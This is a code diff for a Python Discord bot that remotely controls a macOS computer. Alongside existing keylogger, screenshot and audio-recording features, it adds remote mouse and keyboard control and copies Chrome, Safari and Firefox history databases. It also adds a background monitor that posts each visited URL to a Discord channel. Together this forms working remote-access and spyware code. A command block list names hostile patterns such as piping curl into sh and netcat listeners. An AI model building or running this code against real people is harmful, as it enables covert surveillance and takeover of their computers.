@@ -38,10 +38,15 @@ import traceback
 import fnmatch
 import re
 from pathlib import Path
+import pyautogui
 
 # Set up
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('discord')
+
+# Configure PyAutoGUI
+pyautogui.FAILSAFE = True  # Enable failsafe (move mouse to corner to stop)
+pyautogui.PAUSE = 0.1  # Add small pause between actions for safety
 
 # load .env token
 load_dotenv()
@@ -68,6 +73,12 @@ keylogger_listener = None
 keylogger_channel = None
 last_send_time = 0
 
+# variables for website monitoring
+website_monitor_active = False
+website_monitor_thread = None
+website_monitor_channel = None
+last_active_url = ""
+
 # def func
 def take_screenshot():
     """Take a screenshot and save it to a file. Returns the file path."""
@@ -84,6 +95,250 @@ def record_audio(duration=10, sample_rate=44100):
     audio_path = f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav'
     wav.write(audio_path, sample_rate, recording)
     return audio_path
+
+def get_screen_size():
+    """Get current screen dimensions."""
+    try:
+        return pyautogui.size()
+    except Exception as e:
+        logger.error(f"Error getting screen size: {str(e)}")
+        return None
+
+def click_at_coordinates(x: int, y: int, button: str = 'left', clicks: int = 1, hold_duration: float = 0.0):
+    """
+    Click at specific screen coordinates with validation and long click support.
+    
+    Args:
+        x (int): X coordinate
+        y (int): Y coordinate  
+        button (str): Mouse button ('left', 'right', 'middle')
+        clicks (int): Number of clicks (1-10)
+        hold_duration (float): Hold duration in seconds (0.0-10.0, 0.0 for normal click)
+    
+    Returns:
+        tuple: (success: bool, message: str)
+    """
+    try:
+        # Get screen size for validation
+        screen_size = get_screen_size()
+        if not screen_size:
+            return False, "Could not determine screen size"
+        
+        screen_width, screen_height = screen_size
+        
+        # Validate coordinates
+        if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
+            return False, f"Coordinates ({x}, {y}) out of screen bounds (0, 0) to ({screen_width-1}, {screen_height-1})"
+        
+        # Validate button
+        valid_buttons = ['left', 'right', 'middle']
+        if button not in valid_buttons:
+            return False, f"Invalid button '{button}'. Must be one of: {', '.join(valid_buttons)}"
+        
+        # Validate clicks
+        if clicks < 1 or clicks > 10:
+            return False, "Click count must be between 1 and 10"
+        
+        # Validate hold duration
+        if hold_duration < 0.0 or hold_duration > 10.0:
+            return False, "Hold duration must be between 0.0 and 10.0 seconds"
+        
+        # Perform the click
+        if hold_duration > 0.0:
+            # Long click: mouseDown -> sleep -> mouseUp
+            if clicks > 1:
+                return False, "Long clicks (hold_duration > 0) cannot be combined with multiple clicks"
+            
+            pyautogui.mouseDown(x, y, button=button)
+            time.sleep(hold_duration)
+            pyautogui.mouseUp(x, y, button=button)
+            
+            return True, f"Long {button} click at ({x}, {y}) held for {hold_duration}s"
+        else:
+            # Normal click
+            pyautogui.click(x, y, clicks=clicks, button=button)
+            
+            click_type = f"{clicks}x " if clicks > 1 else ""
+            return True, f"{click_type}{button.title()} click at ({x}, {y})"
+        
+    except Exception as e:
+        logger.error(f"Error in click_at_coordinates: {str(e)}")
+        return False, f"Click failed: {str(e)}"
+
+def type_text(text: str, interval: float = 0.01):
+    """
+    Type text with support for special keys.
+    
+    Args:
+        text (str): Text to type (supports \\n for Enter, \\t for Tab)
+        interval (float): Delay between keystrokes
+    
+    Returns:
+        tuple: (success: bool, message: str)
+    """
+    try:
+        # Validate text length
+        if len(text) > 1000:
+            return False, "Text too long (max 1000 characters)"
+        
+        if not text:
+            return False, "No text provided"
+        
+        # Process text with special key support
+        special_keys_processed = 0
+        current_text = ""
+        i = 0
+        
+        while i < len(text):
+            if text[i:i+2] == '\\n':
+                # Type current text if any
+                if current_text:
+                    pyautogui.write(current_text, interval=interval)
+                    current_text = ""
+                # Press Enter
+                pyautogui.press('enter')
+                special_keys_processed += 1
+                i += 2
+            elif text[i:i+2] == '\\t':
+                # Type current text if any
+                if current_text:
+                    pyautogui.write(current_text, interval=interval)
+                    current_text = ""
+                # Press Tab
+                pyautogui.press('tab')
+                special_keys_processed += 1
+                i += 2
+            else:
+                current_text += text[i]
+                i += 1
+        
+        # Type remaining text
+        if current_text:
+            pyautogui.write(current_text, interval=interval)
+        
+        # Build result message
+        char_count = len(text) - (special_keys_processed * 2)  # Subtract escape sequences
+        message = f"Typed {char_count} characters"
+        if special_keys_processed > 0:
+            message += f" with {special_keys_processed} special keys"
+        
+        return True, message
+        
+    except Exception as e:
+        logger.error(f"Error in type_text: {str(e)}")
+        return False, f"Type failed: {str(e)}"
+
+def scroll_at_coordinates(x: int = None, y: int = None, clicks: int = 1, direction: str = 'up'):
+    """
+    Scroll mouse wheel at specific coordinates or current position.
+    
+    Args:
+        x (int, optional): X coordinate (None for current position)
+        y (int, optional): Y coordinate (None for current position)
+        clicks (int): Number of scroll clicks (1-20)
+        direction (str): Scroll direction ('up' or 'down')
+    
+    Returns:
+        tuple: (success: bool, message: str)
+    """
+    try:
+        # Validate clicks
+        if clicks < 1 or clicks > 20:
+            return False, "Scroll clicks must be between 1 and 20"
+        
+        # Validate direction and convert to scroll amount
+        if direction.lower() == 'up':
+            scroll_amount = clicks
+        elif direction.lower() == 'down':
+            scroll_amount = -clicks
+        else:
+            return False, "Direction must be 'up' or 'down'"
+        
+        # If coordinates provided, validate them
+        if x is not None or y is not None:
+            screen_size = get_screen_size()
+            if not screen_size:
+                return False, "Could not determine screen size"
+            
+            screen_width, screen_height = screen_size
+            
+            # Use current position if only one coordinate provided
+            if x is None or y is None:
+                current_x, current_y = pyautogui.position()
+                x = x if x is not None else current_x
+                y = y if y is not None else current_y
+            
+            # Validate coordinates
+            if x < 0 or x >= screen_width or y < 0 or y >= screen_height:
+                return False, f"Coordinates ({x}, {y}) out of screen bounds (0, 0) to ({screen_width-1}, {screen_height-1})"
+            
+            # Scroll at specific coordinates
+            pyautogui.scroll(scroll_amount, x=x, y=y)
+            position_msg = f" at ({x}, {y})"
+        else:
+            # Scroll at current cursor position
+            pyautogui.scroll(scroll_amount)
+            position_msg = " at current cursor position"
+        
+        return True, f"Scrolled {direction} {clicks} clicks{position_msg}"
+        
+    except Exception as e:
+        logger.error(f"Error in scroll_at_coordinates: {str(e)}")
+        return False, f"Scroll failed: {str(e)}"
+
+def execute_hotkey(keys_string: str):
+    """
+    Execute keyboard shortcut/hotkey combination.
+    
+    Args:
+        keys_string (str): Keys separated by + (e.g., "command+c", "ctrl+shift+t")
+    
+    Returns:
+        tuple: (success: bool, message: str)
+    """
+    try:
+        if not keys_string:
+            return False, "No keys provided"
+        
+        # Parse keys by splitting on +
+        keys = [key.strip().lower() for key in keys_string.split('+')]
+        
+        # Validate number of keys
+        if len(keys) > 5:
+            return False, "Maximum 5 keys per shortcut"
+        
+        if len(keys) < 1:
+            return False, "At least 1 key required"
+        
+        # Common key aliases
+        key_aliases = {
+            'cmd': 'command',
+            'control': 'ctrl',
+            'option': 'alt',
+            'meta': 'command'
+        }
+        
+        # Resolve aliases and validate keys
+        resolved_keys = []
+        for key in keys:
+            # Apply alias if exists
+            key = key_aliases.get(key, key)
+            
+            # Validate key exists in PyAutoGUI
+            if key not in pyautogui.KEYBOARD_KEYS:
+                return False, f"Invalid key: '{key}'. Use keys like: command, ctrl, alt, shift, fn, f1-f12, a-z, 0-9, tab, enter, space, arrow keys"
+            
+            resolved_keys.append(key)
+        
+        # Execute hotkey
+        pyautogui.hotkey(*resolved_keys)
+        
+        keys_display = '+'.join(resolved_keys)
+        return True, f"Executed hotkey: {keys_display}"
+        
+    except Exception as e:
+        logger.error(f"Error in execute_hotkey: {str(e)}")
+        return False, f"Hotkey execution failed: {str(e)}"
 
 def get_system_info():
     """Get comprehensive system information as a string."""
@@ -1323,6 +1578,995 @@ def control_youtube_media(action: str):
                     return True, f"Media action '{action}' sent to YouTube (Safari) via fallback"
     return False, "No supported media tab is active"
 
+def get_running_browsers():
+    """Get list of currently running browsers."""
+    browsers = []
+    browser_list = [
+        'Google Chrome', 'Safari', 'Firefox', 'Brave Browser', 
+        'Microsoft Edge', 'Opera', 'Vivaldi'
+    ]
+    
+    for browser in browser_list:
+        if is_process_running([browser]):
+            browsers.append(browser)
+    return browsers
+
+def get_browser_tabs(browser_name="all"):
+    """Get open tabs from specified browser or all browsers."""
+    tabs = []
+    
+    if browser_name == "all":
+        browsers = get_running_browsers()
+    else:
+        browsers = [browser_name] if is_process_running([browser_name]) else []
+    
+    for browser in browsers:
+        if browser == 'Safari':
+            tabs.extend(_get_safari_tabs())
+        elif browser in ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']:
+            tabs.extend(_get_chromium_tabs(browser))
+        elif browser == 'Firefox':
+            tabs.extend(_get_firefox_tabs())
+    
+    return tabs
+
+def _get_safari_tabs():
+    """Get all open tabs from Safari."""
+    tabs = []
+    try:
+        script = '''
+        tell application "Safari"
+            set tabList to {}
+            if (count of documents) > 0 then
+                repeat with w from 1 to count of windows
+                    repeat with t from 1 to count of tabs of window w
+                        set tabInfo to {URL of tab t of window w, name of tab t of window w}
+                        set tabList to tabList & {tabInfo}
+                    end repeat
+                end repeat
+            end if
+            return tabList
+        end tell
+        '''
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
+        if result.returncode == 0 and result.stdout.strip():
+            # Parse AppleScript list output
+            output = result.stdout.strip()
+            # Simple parsing of AppleScript list format
+            if output and output != '{}':
+                # This is a simplified parser - AppleScript list format can be complex
+                lines = output.split(', ')
+                for i in range(0, len(lines), 2):
+                    if i + 1 < len(lines):
+                        url = lines[i].strip().strip('{"')
+                        title = lines[i + 1].strip().strip('"}')
+                        if url and url != 'missing value':
+                            tabs.append({
+                                'browser': 'Safari',
+                                'title': title,
+                                'url': url,
+                                'window': (i // 2) + 1
+                            })
+    except Exception as e:
+        logger.error(f"Error getting Safari tabs: {str(e)}")
+    return tabs
+
+def _get_chromium_tabs(browser_name):
+    """Get all open tabs from Chromium-based browsers."""
+    tabs = []
+    try:
+        script = f'''
+        tell application "{browser_name}"
+            set tabList to {{}}
+            if (count of windows) > 0 then
+                repeat with w from 1 to count of windows
+                    repeat with t from 1 to count of tabs of window w
+                        set tabInfo to {{URL of tab t of window w, title of tab t of window w}}
+                        set tabList to tabList & {{tabInfo}}
+                    end repeat
+                end repeat
+            end if
+            return tabList
+        end tell
+        '''
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
+        if result.returncode == 0 and result.stdout.strip():
+            output = result.stdout.strip()
+            if output and output != '{}':
+                # Simple parsing of AppleScript list format
+                lines = output.split(', ')
+                for i in range(0, len(lines), 2):
+                    if i + 1 < len(lines):
+                        url = lines[i].strip().strip('{"')
+                        title = lines[i + 1].strip().strip('"}')
+                        if url and url != 'missing value':
+                            tabs.append({
+                                'browser': browser_name,
+                                'title': title,
+                                'url': url,
+                                'window': (i // 2) + 1
+                            })
+    except Exception as e:
+        logger.error(f"Error getting {browser_name} tabs: {str(e)}")
+    return tabs
+
+def _get_firefox_tabs():
+    """Get all open tabs from Firefox using AppleScript."""
+    tabs = []
+    try:
+        # Firefox AppleScript support is limited, try basic approach
+        script = '''
+        tell application "Firefox"
+            set windowCount to count of windows
+            if windowCount > 0 then
+                return "Firefox has " & windowCount & " window(s) open"
+            else
+                return "No Firefox windows"
+            end if
+        end tell
+        '''
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
+        if result.returncode == 0:
+            # Firefox has limited AppleScript support, return basic info
+            tabs.append({
+                'browser': 'Firefox',
+                'title': 'Firefox Browser',
+                'url': 'Limited AppleScript support',
+                'window': 1
+            })
+    except Exception as e:
+        logger.error(f"Error getting Firefox tabs: {str(e)}")
+    return tabs
+
+def get_browser_history(browser_name="all", hours=24, limit=50):
+    """Get browser history from databases."""
+    import sqlite3
+    import shutil
+    import tempfile
+    
+    all_history = []
+    
+    if browser_name == "all":
+        all_history.extend(read_chrome_history(limit, hours))
+        all_history.extend(read_safari_history(limit, hours))
+        all_history.extend(read_firefox_history(limit, hours))
+    elif browser_name == "Google Chrome":
+        all_history.extend(read_chrome_history(limit, hours))
+    elif browser_name == "Safari":
+        all_history.extend(read_safari_history(limit, hours))
+    elif browser_name == "Firefox":
+        all_history.extend(read_firefox_history(limit, hours))
+    
+    # Sort by timestamp (most recent first) and limit
+    all_history.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
+    return all_history[:limit]
+
+def read_chrome_history(limit, hours):
+    """Read Chrome browser history from database."""
+    import sqlite3
+    import shutil
+    import tempfile
+    
+    history = []
+    chrome_history_path = os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History')
+    
+    if not os.path.exists(chrome_history_path):
+        return history
+    
+    try:
+        # Create temporary copy since Chrome might have the DB locked
+        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
+            shutil.copy2(chrome_history_path, temp_file.name)
+            temp_db_path = temp_file.name
+        
+        # Calculate time cutoff
+        cutoff_time = int((datetime.now().timestamp() - hours * 3600) * 1000000)  # Chrome uses microseconds
+        
+        conn = sqlite3.connect(temp_db_path)
+        cursor = conn.cursor()
+        
+        query = '''
+        SELECT url, title, visit_count, last_visit_time
+        FROM urls 
+        WHERE last_visit_time > ?
+        ORDER BY last_visit_time DESC 
+        LIMIT ?
+        '''
+        
+        cursor.execute(query, (cutoff_time, limit))
+        rows = cursor.fetchall()
+        
+        for row in rows:
+            url, title, visit_count, last_visit_time = row
+            # Convert Chrome timestamp to Unix timestamp
+            timestamp = (last_visit_time - 11644473600000000) / 1000000
+            history.append({
+                'browser': 'Google Chrome',
+                'url': url,
+                'title': title or 'No Title',
+                'visit_count': visit_count,
+                'timestamp': timestamp,
+                'last_visit': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
+            })
+        
+        conn.close()
+        os.unlink(temp_db_path)  # Clean up temp file
+        
+    except Exception as e:
+        logger.error(f"Error reading Chrome history: {str(e)}")
+        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
+            os.unlink(temp_db_path)
+    
+    return history
+
+def read_safari_history(limit, hours):
+    """Read Safari browser history from database."""
+    import sqlite3
+    import shutil
+    import tempfile
+    
+    history = []
+    safari_history_path = os.path.expanduser('~/Library/Safari/History.db')
+    
+    if not os.path.exists(safari_history_path):
+        return history
+    
+    try:
+        # Create temporary copy
+        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
+            shutil.copy2(safari_history_path, temp_file.name)
+            temp_db_path = temp_file.name
+        
+        # Calculate time cutoff (Safari uses Core Data timestamp)
+        cutoff_time = datetime.now().timestamp() - hours * 3600
+        
+        conn = sqlite3.connect(temp_db_path)
+        cursor = conn.cursor()
+        
+        query = '''
+        SELECT url, title, visit_count, visit_time
+        FROM history_items hi
+        JOIN history_visits hv ON hi.id = hv.history_item
+        WHERE visit_time > ?
+        ORDER BY visit_time DESC 
+        LIMIT ?
+        '''
+        
+        cursor.execute(query, (cutoff_time, limit))
+        rows = cursor.fetchall()
+        
+        for row in rows:
+            url, title, visit_count, visit_time = row
+            history.append({
+                'browser': 'Safari',
+                'url': url,
+                'title': title or 'No Title',
+                'visit_count': visit_count or 1,
+                'timestamp': visit_time,
+                'last_visit': datetime.fromtimestamp(visit_time).strftime('%Y-%m-%d %H:%M:%S')
+            })
+        
+        conn.close()
+        os.unlink(temp_db_path)
+        
+    except Exception as e:
+        logger.error(f"Error reading Safari history: {str(e)}")
+        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
+            os.unlink(temp_db_path)
+    
+    return history
+
+def read_firefox_history(limit, hours):
+    """Read Firefox browser history from database."""
+    import sqlite3
+    import shutil
+    import tempfile
+    import glob
+    
+    history = []
+    
+    # Find Firefox profile directory
+    firefox_profiles = glob.glob(os.path.expanduser('~/Library/Application Support/Firefox/Profiles/*/places.sqlite'))
+    
+    if not firefox_profiles:
+        return history
+    
+    try:
+        # Use the first (or most recent) profile found
+        firefox_history_path = firefox_profiles[0]
+        
+        # Create temporary copy
+        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
+            shutil.copy2(firefox_history_path, temp_file.name)
+            temp_db_path = temp_file.name
+        
+        # Calculate time cutoff (Firefox uses microseconds since Unix epoch)
+        cutoff_time = int((datetime.now().timestamp() - hours * 3600) * 1000000)
+        
+        conn = sqlite3.connect(temp_db_path)
+        cursor = conn.cursor()
+        
+        query = '''
+        SELECT p.url, p.title, p.visit_count, h.visit_date
+        FROM moz_places p
+        JOIN moz_historyvisits h ON p.id = h.place_id
+        WHERE h.visit_date > ?
+        ORDER BY h.visit_date DESC 
+        LIMIT ?
+        '''
+        
+        cursor.execute(query, (cutoff_time, limit))
+        rows = cursor.fetchall()
+        
+        for row in rows:
+            url, title, visit_count, visit_date = row
+            timestamp = visit_date / 1000000  # Convert from microseconds
+            history.append({
+                'browser': 'Firefox',
+                'url': url,
+                'title': title or 'No Title',
+                'visit_count': visit_count or 1,
+                'timestamp': timestamp,
+                'last_visit': datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
+            })
+        
+        conn.close()
+        os.unlink(temp_db_path)
+        
+    except Exception as e:
+        logger.error(f"Error reading Firefox history: {str(e)}")
+        if 'temp_db_path' in locals() and os.path.exists(temp_db_path):
+            os.unlink(temp_db_path)
+    
+    return history
+
+def get_active_website_info():
+    """Get currently active website information from the frontmost browser."""
+    try:
+        running_browsers = get_running_browsers()
+        if not running_browsers:
+            return None
+        
+        # Try to get active tab from each running browser
+        for browser in running_browsers:
+            if browser == 'Safari':
+                info = _get_safari_active_tab()
+                if info:
+                    return info
+            elif browser in ['Google Chrome', 'Brave Browser', 'Microsoft Edge', 'Vivaldi', 'Opera']:
+                info = _get_chromium_active_tab(browser)
+                if info:
+                    return info
+        
+        return None
+    except Exception as e:
+        logger.error(f"Error getting active website info: {str(e)}")
+        return None
+
+def _get_safari_active_tab():
+    """Get active tab info from Safari."""
+    try:
+        script = '''
+        tell application "Safari"
+            if (count of documents) > 0 then
+                set activeTab to current tab of front document
+                return {URL of activeTab, name of activeTab}
+            else
+                return {}
+            end if
+        end tell
+        '''
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
+        if result.returncode == 0 and result.stdout.strip():
+            output = result.stdout.strip()
+            if output and output != '{}':
+                parts = output.split(', ')
+                if len(parts) >= 2:
+                    url = parts[0].strip().strip('{"')
+                    title = parts[1].strip().strip('"}')
+                    return {
+                        'browser': 'Safari',
+                        'title': title,
+                        'url': url
+                    }
+    except Exception:
+        pass
+    return None
+
+def _get_chromium_active_tab(browser_name):
+    """Get active tab info from Chromium-based browser."""
+    try:
+        script = f'''
+        tell application "{browser_name}"
+            if (count of windows) > 0 then
+                set activeTab to active tab of front window
+                return {{URL of activeTab, title of activeTab}}
+            else
+                return {{}}
+            end if
+        end tell
+        '''
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, check=False)
+        if result.returncode == 0 and result.stdout.strip():
+            output = result.stdout.strip()
+            if output and output != '{}':
+                parts = output.split(', ')
+                if len(parts) >= 2:
+                    url = parts[0].strip().strip('{"')
+                    title = parts[1].strip().strip('"}')
+                    return {
+                        'browser': browser_name,
+                        'title': title,
+                        'url': url
+                    }
+    except Exception:
+        pass
+    return None
+
+def website_monitor_loop():
+    """Background thread function for website monitoring."""
+    global website_monitor_active, last_active_url, website_monitor_channel
+    
+    while website_monitor_active:
+        try:
+            current_info = get_active_website_info()
+            
+            if current_info and website_monitor_channel:
+                current_url = current_info['url']
+                
+                # Check if the active website changed
+                if current_url != last_active_url and current_url != 'missing value':
+                    last_active_url = current_url
+                    
+                    # Send update to Discord
+                    title = current_info['title'][:100] + "..." if len(current_info['title']) > 100 else current_info['title']
+                    url = current_info['url'][:100] + "..." if len(current_info['url']) > 100 else current_info['url']
+                    
+                    message = f"🌐 **Website Changed**\n"
+                    message += f"**Browser**: {current_info['browser']}\n"
+                    message += f"**Title**: {title}\n"
+                    message += f"**URL**: `{url}`\n"
+                    message += f"**Time**: {datetime.now().strftime('%H:%M:%S')}"
+                    
+                    asyncio.run_coroutine_threadsafe(
+                        website_monitor_channel.send(message),
+                        bot.loop
+                    )
+            
+            # Wait before next check (default 30 seconds)
+            time.sleep(30)
+            
+        except Exception as e:
+            logger.error(f"Error in website monitor loop: {str(e)}")
+            time.sleep(30)
+
+def start_website_monitor(channel, interval=30):
+    """Start website monitoring in background thread."""
+    global website_monitor_active, website_monitor_thread, website_monitor_channel
+    
+    if website_monitor_active:
+        return False, "Website monitor is already running"
+    
+    website_monitor_active = True
+    website_monitor_channel = channel
+    website_monitor_thread = threading.Thread(target=website_monitor_loop, daemon=True)
+    website_monitor_thread.start()
+    
+    return True, f"Website monitor started (checking every {interval} seconds)"
+
+def stop_website_monitor():
+    """Stop website monitoring."""
+    global website_monitor_active, website_monitor_thread, website_monitor_channel, last_active_url
+    
+    if not website_monitor_active:
+        return False, "Website monitor is not running"
+    
+    website_monitor_active = False
+    website_monitor_channel = None
+    last_active_url = ""
+    
+    # Wait for thread to finish
+    if website_monitor_thread and website_monitor_thread.is_alive():
+        website_monitor_thread.join(timeout=5)
+    
+    return True, "Website monitor stopped"
+
+def is_url(target):
+    """Check if target is a URL."""
+    return (target.startswith(('http://', 'https://')) or 
+            ('.' in target and ' ' not in target and not target.startswith('/')))
+
+def resolve_app_name(name):
+    """Resolve app name aliases to full application names."""
+    app_aliases = {
+        'chrome': 'Google Chrome',
+        'safari': 'Safari',
+        'firefox': 'Firefox',
+        'brave': 'Brave Browser',
+        'edge': 'Microsoft Edge',
+        'vscode': 'Visual Studio Code',
+        'code': 'Visual Studio Code',
+        'spotify': 'Spotify',
+        'discord': 'Discord',
+        'terminal': 'Terminal',
+        'calc': 'Calculator',
+        'calculator': 'Calculator',
+        'notes': 'Notes',
+        'finder': 'Finder',
+        'activity': 'Activity Monitor',
+        'monitor': 'Activity Monitor',
+        'preferences': 'System Preferences',
+        'settings': 'System Preferences',
+        'photoshop': 'Adobe Photoshop 2024',
+        'ps': 'Adobe Photoshop 2024',
+        'xcode': 'Xcode',
+        'docker': 'Docker Desktop',
+        'github': 'GitHub Desktop',
+        'slack': 'Slack',
+        'zoom': 'zoom.us',
+        'teams': 'Microsoft Teams',
+        'mail': 'Mail',
+        'calendar': 'Calendar',
+        'facetime': 'FaceTime',
+        'messages': 'Messages',
+        'maps': 'Maps',
+        'music': 'Music',
+        'tv': 'TV',
+        'photos': 'Photos',
+        'preview': 'Preview'
+    }
+    return app_aliases.get(name.lower(), name)
+
+def validate_target_safety(target):
+    """Validate that target is safe to open."""
+    # Block dangerous system files and directories
+    dangerous_paths = [
+        '/System', '/usr/bin', '/bin', '/sbin',
+        '/.ssh', '/etc', '/var/log'
+    ]
+    
+    # Check for dangerous file extensions
+    dangerous_extensions = [
+        '.sh', '.command', '.app/Contents/MacOS',
+        '.scpt', '.scptd'
+    ]
+    
+    target_lower = target.lower()
+    
+    # Block dangerous paths
+    for dangerous in dangerous_paths:
+        if target.startswith(dangerous):
+            return False, f"Access to {dangerous} is restricted for security"
+    
+    # Block dangerous extensions
+    for ext in dangerous_extensions:
+        if target_lower.endswith(ext):
+            return False, f"Cannot open {ext} files for security reasons"
+    
+    return True, "Target is safe"
+
+def open_application(app_name, args=None):
+    """Open an application using macOS open command."""
+    try:
+        resolved_name = resolve_app_name(app_name)
+        cmd = ['open', '-a', resolved_name]
+        
+        if args:
+            cmd.extend(['--args'] + args.split())
+        
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        
+        if result.returncode == 0:
+            return True, f"Successfully opened {resolved_name}"
+        else:
+            # Try alternative method with AppleScript
+            script = f'tell application "{resolved_name}" to activate'
+            result2 = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
+            
+            if result2.returncode == 0:
+                return True, f"Successfully opened {resolved_name}"
+            else:
+                return False, f"Failed to open {resolved_name}. Application may not be installed."
+                
+    except subprocess.TimeoutExpired:
+        return False, f"Timeout while trying to open {app_name}"
+    except Exception as e:
+        return False, f"Error opening application: {str(e)}"
+
+def open_url_or_website(url):
+    """Open URL or website in default browser."""
+    try:
+        # Add https:// if no protocol specified
+        if not url.startswith(('http://', 'https://')):
+            # Check if it's a special search query
+            if url.startswith('search:'):
+                query = url[7:].strip()
+                url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
+            else:
+                url = f"https://{url}"
+        
+        webbrowser.open(url)
+        return True, f"Successfully opened {url}"
+        
+    except Exception as e:
+        return False, f"Error opening URL: {str(e)}"
+
+def open_file_or_folder(path):
+    """Open file or folder using macOS open command."""
+    try:
+        # Expand user path
+        expanded_path = os.path.expanduser(path)
+        
+        # Check if path exists
+        if not os.path.exists(expanded_path):
+            return False, f"Path does not exist: {path}"
+        
+        # Safety validation
+        is_safe, safety_msg = validate_target_safety(expanded_path)
+        if not is_safe:
+            return False, safety_msg
+        
+        result = subprocess.run(['open', expanded_path], capture_output=True, text=True, timeout=10)
+        
+        if result.returncode == 0:
+            return True, f"Successfully opened {path}"
+        else:
+            return False, f"Failed to open {path}: {result.stderr.strip()}"
+            
+    except subprocess.TimeoutExpired:
+        return False, f"Timeout while trying to open {path}"
+    except Exception as e:
+        return False, f"Error opening file/folder: {str(e)}"
+
+def open_system_preference(pref_name):
+    """Open specific system preference pane."""
+    try:
+        # Common system preference mappings
+        pref_mappings = {
+            'network': 'Network',
+            'security': 'Security & Privacy',
+            'privacy': 'Security & Privacy',
+            'displays': 'Displays',
+            'sound': 'Sound',
+            'keyboard': 'Keyboard',
+            'mouse': 'Mouse',
+            'trackpad': 'Trackpad',
+            'bluetooth': 'Bluetooth',
+            'wifi': 'Network',
+            'users': 'Users & Groups',
+            'accounts': 'Users & Groups',
+            'time': 'Date & Time',
+            'date': 'Date & Time',
+            'sharing': 'Sharing',
+            'accessibility': 'Accessibility',
+            'general': 'General',
+            'dock': 'Dock & Menu Bar',
+            'desktop': 'Desktop & Screen Saver',
+            'wallpaper': 'Desktop & Screen Saver'
+        }
+        
+        mapped_pref = pref_mappings.get(pref_name.lower(), pref_name)
+        
+        # Use AppleScript to open specific preference pane
+        script = f'''
+        tell application "System Preferences"
+            activate
+            set current pane to pane "{mapped_pref}"
+        end tell
+        '''
+        
+        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
+        
+        if result.returncode == 0:
+            return True, f"Successfully opened {mapped_pref} preferences"
+        else:
+            # Fallback to just opening System Preferences
+            result2 = subprocess.run(['open', '-a', 'System Preferences'], capture_output=True, text=True, timeout=10)
+            if result2.returncode == 0:
+                return True, f"Opened System Preferences (could not find specific pane: {pref_name})"
+            else:
+                return False, f"Failed to open System Preferences"
+                
+    except subprocess.TimeoutExpired:
+        return False, f"Timeout while trying to open system preferences"
+    except Exception as e:
+        return False, f"Error opening system preferences: {str(e)}"
+
+def open_target(target, args=None):
+    """Smart target opening with automatic detection."""
+    try:
+        target = target.strip()
+        
+        # Empty target
+        if not target:
+            return False, "No target specified"
+        
+        # URL detection
+        if is_url(target):
+            return open_url_or_website(target)
+        
+        # System preference detection
+        if target.lower().startswith(('pref:', 'preference:', 'setting:')):
+            pref_name = target.split(':', 1)[1].strip()
+            return open_system_preference(pref_name)
+        
+        # File path detection (starts with / or ~)
+        if target.startswith(('/', '~')):
+            return open_file_or_folder(target)
+        
+        # Special folder shortcuts
+        special_folders = {
+            'downloads': '~/Downloads',
+            'documents': '~/Documents',
+            'desktop': '~/Desktop',
+            'applications': '/Applications',
+            'home': '~/',
+            'trash': '~/.Trash'
+        }
+        
+        if target.lower() in special_folders:
+            return open_file_or_folder(special_folders[target.lower()])
+        
+        # Search query detection
+        if target.lower().startswith('search:'):
+            return open_url_or_website(target)
+        
+        # Default to application opening
+        return open_application(target, args)
+        
+    except Exception as e:
+        return False, f"Error processing target: {str(e)}"
+
+# Command execution history (global variable)
+command_history = []
+
+def validate_command_safety(command):
+    """Validate that command is safe to execute."""
+    command_lower = command.lower().strip()
+    
+    # Blocked dangerous commands
+    dangerous_commands = [
+        'rm -rf', 'sudo rm', 'mkfs', 'dd if=', 'format',
+        'del /f /s /q', ':(){ :|:& };:', 'chmod 000',
+        'sudo passwd', 'sudo su', 'sudo -i', 'sudo -s',
+        'fdisk', 'parted', 'diskutil erase', 'newfs',
+        'halt', 'reboot', 'init 0', 'init 6',
+        'killall -9', 'kill -9 1', 'pkill -9 -f .',
+        '; rm ', '&& rm ', '| rm ', '$(rm', '`rm',
+        'curl | sh', 'wget | sh', 'bash <(',
+        'nc -l', 'netcat -l', '/bin/sh', '/bin/bash',
+        'python -c', 'perl -e', 'ruby -e'
+    ]
+    
+    # Blocked system paths modifications
+    dangerous_paths = [
+        '/system', '/usr/bin', '/bin', '/sbin', '/etc',
+        '/var/log', '/boot', '/proc', '/.ssh'
+    ]
+    
+    # Check for dangerous command patterns
+    for dangerous in dangerous_commands:
+        if dangerous in command_lower:
+            return False, f"Blocked dangerous command pattern: {dangerous}"
+    
+    # Check for dangerous path operations
+    for path in dangerous_paths:
+        if f"rm {path}" in command_lower or f"rm -r {path}" in command_lower:
+            return False, f"Blocked system path modification: {path}"
+    
+    # Block sudo commands by default
+    if command_lower.startswith('sudo '):
+        return False, "Sudo commands are blocked for security. Use specific commands without sudo."
+    
+    # Block commands with suspicious redirections
+    suspicious_redirects = ['> /dev/', '> /etc/', '> /usr/', '> /bin/', '> /sbin/']
+    for redirect in suspicious_redirects:
+        if redirect in command_lower:
+            return False, f"Blocked suspicious output redirection: {redirect}"
+    
+    # Block potentially infinite loops
+    if 'while true' in command_lower or 'for ((;;))' in command_lower:
+        return False, "Infinite loop commands are blocked"
+    
+    return True, "Command is safe"
+
+def resolve_command_alias(command):
+    """Resolve command aliases to full commands."""
+    command = command.strip()
+    aliases = {
+        'sysinfo': 'system_profiler SPHardwareDataType',
